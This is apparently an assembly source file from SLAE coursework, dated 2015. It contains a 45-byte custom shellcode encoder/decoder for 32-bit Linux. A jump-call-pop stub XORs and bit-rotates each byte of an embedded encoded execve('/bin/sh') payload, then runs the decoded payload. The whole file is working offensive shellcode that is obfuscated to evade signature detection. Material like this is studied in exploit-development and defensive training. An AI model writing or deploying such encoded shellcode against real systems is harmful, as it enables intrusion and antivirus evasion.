; Title: Custom Shellcode [En|De]coder - 45 byte
; Platform: linux/x86
; Date: 2015-01-09
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; Github: https://github.com/dhn/SLAE/
; SLAE-721

BITS 32

global _start
section .text

XOR_VALUE equ 0x5f            ; XOR value
ROL_BITS  equ 0x05            ; Rotated bits

_start:
	; Custom Shellcode [En|De]coder - 45 byte
	jmp short get_shellcode   ; jump-call-pop

decoder:
	pop esi                   ; get save pointer
	xor ecx, ecx              ; clean ecx
	mov cl, len               ; set ecx = len(shellcode)

decode:
	xor BYTE [esi], XOR_VALUE ; XOR current byte
	ror BYTE [esi], ROL_BITS  ; rotate right ROL_BITS
	inc esi                   ; increment esi
	loop decode               ; loop until esx = 0

	jmp short shellcode       ; jump to shellcode

get_shellcode:
	call decoder              ; call decoder methode

	; encoded execve "/bin/sh" shellcode - 22 byte
	shellcode db 0x12,0x3e,0x54,0x79,0x66,0x75, \
	             0x52,0xba,0xba,0x31,0x52,0x52, \
	             0xba,0x13,0x72,0x92,0x6e,0x23, \
	             0x6e,0x06,0xe6,0x4f

	len: equ $-shellcode      ; shellcode length
